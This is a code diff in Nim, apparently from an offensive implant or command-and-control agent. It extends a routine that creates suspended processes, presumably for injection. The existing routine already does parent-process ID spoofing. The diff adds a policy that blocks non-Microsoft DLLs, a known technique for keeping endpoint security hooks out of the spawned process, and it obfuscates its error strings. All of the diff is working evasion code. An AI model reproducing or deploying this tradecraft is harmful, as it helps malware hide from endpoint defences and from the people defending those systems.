@@ -13,6 +13,8 @@ when defined(windows):
     PROCESS_QUERY_INFORMATION = 0x0400
     EXTENDED_STARTUPINFO_PRESENT = 0x00080000
     PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
+    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
+    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000'u64
   
   type
     PROC_THREAD_ATTRIBUTE_LIST = object
@@ -48,32 +50,52 @@ type
 
 when defined(windows):
   proc createSuspendedProcess(spawntoPath: string, ppid: uint32): tuple[success: bool, pi: PROCESS_INFORMATION, error: string] =
-    ## Create a suspended process with optional PPID spoofing
+    ## Create a suspended process with optional PPID spoofing and DLL blocking
     var pi: PROCESS_INFORMATION
     
-    if ppid != 0:
-      # PPID spoofing - use extended process creation
-      let parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
-      if parentHandle == 0:
-        return (false, pi, obf("Failed to open parent process: ") & $GetLastError())
+    let blockDlls = getBlockDlls()
+    let useExtended = ppid != 0 or blockDlls
+    
+    if useExtended:
+      # Count attributes needed
+      var attrCount: DWORD = 0
+      if ppid != 0: attrCount += 1
+      if blockDlls: attrCount += 1
+      
+      # Open parent process for PPID spoofing if needed
+      var parentHandle: HANDLE = 0
+      if ppid != 0:
+        parentHandle = OpenProcess(PROCESS_CREATE_PROCESS or PROCESS_QUERY_INFORMATION, 0, DWORD(ppid))
+        if parentHandle == 0:
+          return (false, pi, obf("Failed to open parent process: ") & $GetLastError())
       
       # Initialize attribute list
       var size: SIZE_T = 0
-      discard InitializeProcThreadAttributeList(nil, 1, 0, addr size)
+      discard InitializeProcThreadAttributeList(nil, attrCount, 0, addr size)
       
       var attrList = newSeq[byte](size)
       let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST](addr attrList[0])
       
-      if InitializeProcThreadAttributeList(attrListPtr, 1, 0, addr size) == 0:
-        CloseHandle(parentHandle)
+      if InitializeProcThreadAttributeList(attrListPtr, attrCount, 0, addr size) == 0:
+        if parentHandle != 0: CloseHandle(parentHandle)
         return (false, pi, obf("Failed to initialize attribute list: ") & $GetLastError())
       
-      # Update attribute with parent process handle
-      if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
-                                   addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
-        DeleteProcThreadAttributeList(attrListPtr)
-        CloseHandle(parentHandle)
-        return (false, pi, obf("Failed to update attribute list: ") & $GetLastError())
+      # Add PPID spoofing attribute
+      if ppid != 0:
+        if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+                                     addr parentHandle, SIZE_T(sizeof(HANDLE)), nil, nil) == 0:
+          DeleteProcThreadAttributeList(attrListPtr)
+          CloseHandle(parentHandle)
+          return (false, pi, obf("Failed to update attribute list (PPID): ") & $GetLastError())
+      
+      # Add block DLLs mitigation policy attribute
+      var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
+      if blockDlls:
+        if UpdateProcThreadAttribute(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                                     addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil) == 0:
+          DeleteProcThreadAttributeList(attrListPtr)
+          if parentHandle != 0: CloseHandle(parentHandle)
+          return (false, pi, obf("Failed to update attribute list (BlockDLLs): ") & $GetLastError())
       
       # Create process with extended startup info
       var siEx: STARTUPINFOEXA
@@ -94,10 +116,10 @@ when defined(windows):
       )
       
       DeleteProcThreadAttributeList(attrListPtr)
-      CloseHandle(parentHandle)
+      if parentHandle != 0: CloseHandle(parentHandle)
       
       if success == 0:
-        return (false, pi, obf("Failed to create process with PPID spoofing: ") & $GetLastError())
+        return (false, pi, obf("Failed to create suspended process: ") & $GetLastError())
     else:
       # Normal process creation without PPID spoofing
       var si: STARTUPINFOA
